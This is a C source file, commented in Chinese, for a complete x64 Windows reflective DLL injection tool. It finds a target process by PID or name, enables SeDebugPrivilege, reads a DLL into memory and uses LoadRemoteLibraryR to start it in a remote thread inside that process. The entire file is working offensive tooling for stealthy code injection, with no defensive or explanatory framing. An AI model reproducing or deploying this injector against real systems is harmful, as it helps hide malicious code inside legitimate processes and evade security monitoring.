/*
 * Reflective DLL Injection - Injector
 *
 * 反射 DLL 注入器
 *
 * 用法:
 *   inject.exe <PID> [DLL路径]
 *   inject.exe <进程名称> [DLL路径]
 *
 * 示例:
 *   inject.exe 1234                      # 注入到进程 1234（使用默认 DLL）
 *   inject.exe notepad.exe test.dll      # 注入到记事本进程
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryR.h"

#pragma comment(lib, "Advapi32.lib")

// 默认 DLL 文件
#define DEFAULT_DLL_FILE "reflective_dll.dll"

// 错误输出宏
#define BREAK_WITH_ERROR(e) { \
    printf("[-] %s\n", e); \
    printf("[-] 错误代码: %lu\n", GetLastError()); \
    break; \
}

// ========================================
// 辅助函数：通过进程名查找 PID
// ========================================

DWORD FindProcessByName(const char *processName)
{
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 pe32 = {0};
    DWORD dwPid = 0;

    printf("[*] 搜索进程: %s\n", processName);

    // 创建进程快照
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] 创建快照失败: %lu\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 遍历进程
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // 比较进程名（不区分大小写）
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                dwPid = pe32.th32ProcessID;
                printf("[+] 找到进程: %s (PID: %lu)\n", pe32.szExeFile, dwPid);
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    if (dwPid == 0) {
        printf("[!] 未找到进程: %s\n", processName);
    }

    return dwPid;
}

// ========================================
// 辅助函数：提升调试权限
// ========================================

BOOL EnableDebugPrivilege(VOID)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES priv = {0};

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken 失败: %lu\n", GetLastError());
        return FALSE;
    }

    priv.PrivilegeCount = 1;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
        printf("[!] LookupPrivilegeValue 失败: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges 失败: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    printf("[+] 调试权限已提升\n");
    return TRUE;
}

// ========================================
// 打印使用说明
// ========================================

void PrintUsage(const char *programName)
{
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║         Reflective DLL Injection Tool (x64)             ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("用法:\n");
    printf("  %s <PID> [DLL路径]\n", programName);
    printf("  %s <进程名> [DLL路径]\n\n", programName);
    printf("参数:\n");
    printf("  PID      - 目标进程 ID（数字）\n");
    printf("  进程名   - 目标进程名称（如 notepad.exe）\n");
    printf("  DLL路径  - 可选，默认为 %s\n\n", DEFAULT_DLL_FILE);
    printf("示例:\n");
    printf("  %s 1234\n", programName);
    printf("  %s notepad.exe\n", programName);
    printf("  %s 1234 C:\\test\\my.dll\n\n", programName);
    printf("注意:\n");
    printf("  - DLL 必须导出 ReflectiveLoader 函数\n");
    printf("  - 目标进程必须是 x64 架构\n");
    printf("  - 需要管理员权限注入系统进程\n\n");
}

// ========================================
// 主函数
// ========================================

int main(int argc, char *argv[])
{
    HANDLE hFile = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID lpBuffer = NULL;
    DWORD dwLength = 0;
    DWORD dwBytesRead = 0;
    DWORD dwProcessId = 0;
    char *cpDllFile = DEFAULT_DLL_FILE;
    BOOL isNumber = TRUE;

    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║         Reflective DLL Injection Tool (x64)             ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\n");

    do {
        // ========================================
        // 参数解析
        // ========================================

        if (argc < 2) {
            PrintUsage(argv[0]);
            return 1;
        }

        // 检查第一个参数是数字（PID）还是字符串（进程名）
        for (int i = 0; argv[1][i]; i++) {
            if (!isdigit((unsigned char)argv[1][i])) {
                isNumber = FALSE;
                break;
            }
        }

        if (isNumber) {
            // PID
            dwProcessId = atoi(argv[1]);
            printf("[*] 目标进程 ID: %lu\n", dwProcessId);
        } else {
            // 进程名
            dwProcessId = FindProcessByName(argv[1]);
            if (dwProcessId == 0)
                break;
        }

        // DLL 文件路径
        if (argc >= 3) {
            cpDllFile = argv[2];
        }

        printf("[*] DLL 文件: %s\n", cpDllFile);

        // ========================================
        // 读取 DLL 文件
        // ========================================

        hFile = CreateFileA(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            BREAK_WITH_ERROR("无法打开 DLL 文件");

        dwLength = GetFileSize(hFile, NULL);
        if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
            BREAK_WITH_ERROR("无法获取 DLL 文件大小");

        printf("[+] DLL 文件大小: %lu 字节\n", dwLength);

        lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
        if (!lpBuffer)
            BREAK_WITH_ERROR("无法分配内存");

        if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE)
            BREAK_WITH_ERROR("无法读取 DLL 文件");

        CloseHandle(hFile);
        hFile = NULL;

        printf("[+] DLL 文件已加载到内存\n");

        // ========================================
        // 提升权限
        // ========================================

        EnableDebugPrivilege();

        // ========================================
        // 打开目标进程
        // ========================================

        hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            FALSE,
            dwProcessId);

        if (!hProcess)
            BREAK_WITH_ERROR("无法打开目标进程");

        printf("[+] 目标进程已打开\n");

        // 检查架构（必须是 x64）
        BOOL isWow64 = FALSE;
        IsWow64Process(hProcess, &isWow64);
        if (isWow64) {
            printf("[!] 错误: 目标进程是 32 位，本工具仅支持 x64\n");
            break;
        }

        printf("[+] 目标进程架构: x64\n");

        // ========================================
        // 执行反射注入
        // ========================================

        printf("\n[*] 开始反射注入...\n");
        printf("──────────────────────────────────────────────────────────\n");

        hThread = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);

        printf("──────────────────────────────────────────────────────────\n");

        if (!hThread)
            BREAK_WITH_ERROR("反射注入失败");

        printf("\n[+] ✅ 反射注入成功!\n");
        printf("[*] 等待远程线程执行...\n");

        // 等待远程线程执行完成
        WaitForSingleObject(hThread, 5000);

        DWORD dwExitCode = 0;
        if (GetExitCodeThread(hThread, &dwExitCode)) {
            if (dwExitCode == STILL_ACTIVE) {
                printf("[+] 远程线程仍在运行\n");
            } else {
                printf("[+] 远程线程已退出，退出代码: 0x%08lX\n", dwExitCode);
            }
        }

    } while (0);

    // ========================================
    // 清理资源
    // ========================================

    if (lpBuffer)
        HeapFree(GetProcessHeap(), 0, lpBuffer);

    if (hFile)
        CloseHandle(hFile);

    if (hThread)
        CloseHandle(hThread);

    if (hProcess)
        CloseHandle(hProcess);

    printf("\n");
    return 0;
}
